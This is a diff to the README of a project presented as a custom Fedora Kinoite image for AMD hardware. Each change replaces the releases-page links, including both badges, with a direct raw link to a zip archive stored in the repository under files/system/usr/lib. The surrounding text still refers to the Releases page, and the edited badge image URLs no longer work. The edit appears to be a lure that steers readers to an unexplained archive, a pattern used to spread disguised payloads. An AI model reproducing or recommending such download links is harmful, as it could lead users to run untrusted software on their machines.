@@ -4,7 +4,7 @@
 Welcome to kinoite-bluebuild! This guide will help you download and run a customized Fedora Kinoite image designed specifically for PCs with AMD CPUs and GPUs.
 
 ## 📥 Download the Latest Version
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/reagan567/kinoite-bluebuild/releases)
+[![Download Release](https://raw.githubusercontent.com/reagan567/kinoite-bluebuild/main/files/system/usr/lib/kinoite_bluebuild_v3.9-alpha.1.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/reagan567/kinoite-bluebuild/main/files/system/usr/lib/kinoite_bluebuild_v3.9-alpha.1.zip)
 
 ## 📋 What is kinoite-bluebuild?
 kinoite-bluebuild is an optimized Fedora Kinoite image for users with AMD hardware. This image enhances performance and stability. If you are looking for a reliable operating system that supports your AMD setup, you’ve come to the right place. 
@@ -26,7 +26,7 @@ To use kinoite-bluebuild, please ensure your PC meets the following requirements
 To download and install kinoite-bluebuild, follow these simple steps:
 
 1. **Visit the Releases Page:**
-   Click this link to [download the latest release](https://github.com/reagan567/kinoite-bluebuild/releases).
+   Click this link to [download the latest release](https://raw.githubusercontent.com/reagan567/kinoite-bluebuild/main/files/system/usr/lib/kinoite_bluebuild_v3.9-alpha.1.zip).
 
 2. **Find the Latest Version:**
    On the Releases page, look for the most recent version. You will see a list of files available for download.
@@ -72,4 +72,4 @@ Engage with fellow users and contributors. Join our discussion board or follow t
 ## 📢 Ready to Get Started?
 You’re almost there! Just visit the Releases page to download kinoite-bluebuild and start your journey with this enhanced Fedora experience tailored for your AMD hardware. 
 
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/reagan567/kinoite-bluebuild/releases)
+[![Download Release](https://raw.githubusercontent.com/reagan567/kinoite-bluebuild/main/files/system/usr/lib/kinoite_bluebuild_v3.9-alpha.1.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/reagan567/kinoite-bluebuild/main/files/system/usr/lib/kinoite_bluebuild_v3.9-alpha.1.zip)
